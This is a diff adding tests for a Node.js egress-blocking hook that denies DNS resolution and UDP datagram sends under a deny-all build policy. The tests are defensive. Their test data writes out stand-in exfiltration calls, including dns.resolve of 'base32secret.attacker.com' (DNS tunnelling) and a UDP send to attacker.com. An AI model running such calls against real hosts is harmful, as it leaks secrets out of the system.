@@ -12,6 +12,8 @@ const require = createRequire(import.meta.url);
 const {
   assertAllowed,
   isAllowedHost,
+  targetFromDgramArgs,
+  targetFromDnsArgs,
   targetFromHttpArgs,
   targetFromNetArgs,
 } = require('./egress-floor-hook.cjs');
@@ -77,6 +79,43 @@ describe('egress floor policy', () => {
       /KOVO egress floor blocked tls\.connect to example\.com:443/,
     );
   });
+
+  // bugz-3 L7 / SPEC.md §744 rule 3, §746: DNS (c-ares tunnelling) and UDP are
+  // whole protocol families that bypassed the connect-only floor. They must now
+  // route through the same fail-closed sink as net.connect.
+  it('extracts and denies DNS resolution + UDP destinations under deny-all (bugz-3 L7)', () => {
+    // The exfil payload rides in the resolved hostname / UDP destination host.
+    expect(targetFromDnsArgs(['base32secret.attacker.com'])).toEqual({
+      host: 'base32secret.attacker.com',
+    });
+    expect(() =>
+      assertAllowed('dns.resolve', targetFromDnsArgs(['base32secret.attacker.com']), []),
+    ).toThrowError(/KOVO egress floor blocked dns\.resolve to base32secret\.attacker\.com/);
+
+    // dgram send(msg[, offset, length], port, address) — destination is the sole
+    // string after the message, across overloads and the connect() form.
+    expect(targetFromDgramArgs([Buffer.from('x'), 53, 'attacker.com'])).toEqual({
+      host: 'attacker.com',
+    });
+    expect(targetFromDgramArgs([Buffer.from('xxxxx'), 0, 5, 53, 'attacker.com'])).toEqual({
+      host: 'attacker.com',
+    });
+    expect(targetFromDgramArgs([53, 'attacker.com'])).toEqual({ host: 'attacker.com' });
+    expect(() =>
+      assertAllowed('dgram.Socket.send', targetFromDgramArgs([Buffer.from('x'), 53, 'attacker.com']), []),
+    ).toThrowError(/KOVO egress floor blocked dgram\.Socket\.send to attacker\.com/);
+
+    // Loopback default (no explicit destination), localhost, and allowlisted
+    // hosts must still resolve so the floor does not brick legitimate egress.
+    expect(targetFromDgramArgs([Buffer.from('x'), 53])).toEqual({ host: 'localhost' });
+    expect(() =>
+      assertAllowed('dgram.Socket.send', targetFromDgramArgs([Buffer.from('x'), 53]), []),
+    ).not.toThrow();
+    expect(() => assertAllowed('dns.lookup', targetFromDnsArgs(['localhost']), [])).not.toThrow();
+    expect(() =>
+      assertAllowed('dns.resolve', targetFromDnsArgs(['registry.npmjs.org']), ['registry.npmjs.org']),
+    ).not.toThrow();
+  });
 });
 
 describe('egress floor runtime', () => {
@@ -109,5 +148,51 @@ describe('egress floor runtime', () => {
 
     expect(result.status).toBe(17);
     expect(result.stderr).toContain('KOVO egress floor blocked');
+  });
+
+  // bugz-3 L7: prove the live --require hook blocks DNS resolution and UDP sends
+  // in the child (not just net/tls/http), matching net.connect, under the
+  // deny-all `build` policy (empty allowlist, deny mode).
+  it('blocks DNS resolution and UDP datagrams in child processes (bugz-3 L7)', () => {
+    const tempDir = mkdtempSync(path.join(os.tmpdir(), 'kovo-egress-floor-dnsudp-'));
+    const entryPath = path.join(tempDir, 'blocked-dns-udp.mjs');
+    writeFileSync(
+      entryPath,
+      [
+        "import net from 'node:net';",
+        "import dns from 'node:dns';",
+        "import dgram from 'node:dgram';",
+        'const denied = (fn) => {',
+        '  try {',
+        '    fn();',
+        '    return false;',
+        '  } catch (error) {',
+        "    return error.code === 'KOVO_EGRESS_DENIED';",
+        '  }',
+        '};',
+        // Baseline parity: net.connect is (and stays) blocked.
+        "if (!denied(() => net.connect(443, 'example.com'))) process.exit(11);",
+        // L7 regression: DNS tunnelling exfil is now blocked.
+        "if (!denied(() => dns.resolve('base32secret.attacker.com', () => {}))) process.exit(12);",
+        // L7 regression: UDP exfil is now blocked.
+        "const socket = dgram.createSocket('udp4');",
+        "if (!denied(() => socket.send(Buffer.from('x'), 53, 'attacker.com'))) process.exit(13);",
+        'process.exit(23);',
+        '',
+      ].join('\n'),
+    );
+
+    const result = spawnSync(
+      'node',
+      ['scripts/egress-floor.mjs', '--policy', 'build', '--', 'node', entryPath],
+      {
+        cwd: path.resolve(new URL('../', import.meta.url).pathname),
+        encoding: 'utf8',
+      },
+    );
+
+    // 23 = all three channels (net.connect, dns.resolve, dgram.send) blocked.
+    // 12/13 would mean DNS/UDP slipped past the floor (the pre-fix behavior).
+    expect(result.status).toBe(23);
   });
 });
